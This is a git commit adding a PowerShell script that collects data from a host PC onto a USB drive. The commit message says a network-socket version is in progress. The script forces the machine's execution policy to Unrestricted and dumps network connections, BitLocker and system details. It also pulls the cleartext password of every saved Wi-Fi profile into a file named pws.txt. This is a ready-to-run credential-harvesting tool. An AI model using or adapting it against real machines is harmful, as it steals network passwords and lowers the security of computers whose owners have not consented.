91f3084c1499f99db363152871c4aa8bf97e94b0
Bacon-HAL <56642323+bacon-GIT@users.noreply.github.com>
2020-09-21 00:49:19 -0400

    Init upload
    This grabs a bunch of info from a host computer and uploads it to a USB plugged into the host. Currently working on a socket version

---
+++ get-hostinfo.ps1
@@ -0,0 +1,36 @@
+﻿<# Quick powershell script to retrieve as much info from a host PC as possible #>
+
+Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope LocalMachine
+$time_now = Get-Date -format "HH:mm:ss"
+$hn = hostname
+$logs_path = "D:\$hn"
+
+# This will run if no USB connected
+if (Test-Path "D:\") {
+    if (!(Test-Path $logs_path)) {
+        New-Item -Path $logs_path -ItemType "directory"
+    }
+} else {
+    $cwd = Get-Location
+    New-Item -Path "$cwd\$hn" -ItemType "directory"
+}
+    
+
+# Get netlogs
+Get-NetTCPConnection | Out-File -FilePath $logs_path\netlogs.txt
+Get-BitLockerVolume | Out-File -FilePath $logs_path\drives_info.txt
+Get-ComputerInfo | Out-File -FilePath $logs_path\comp_info.txt
+Get-NetIPAddress | Out-File -FilePath $logs_path\ips.txt
+
+# Got these lines from: https://chrishales.wordpress.com/2018/01/03/powershell-password-one-liners/
+
+(netsh wlan show profiles) `
+    | Select-String "\:(.+)$" `
+    | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} `
+    | %{(netsh wlan show profile name="$name" key=clear)}  `
+    | Select-String "Key Content\W+\:(.+)$" `
+    | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} `
+    | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} `
+    | Format-Table -AutoSize `
+    | Out-File -FilePath $logs_path\pws.txt
+
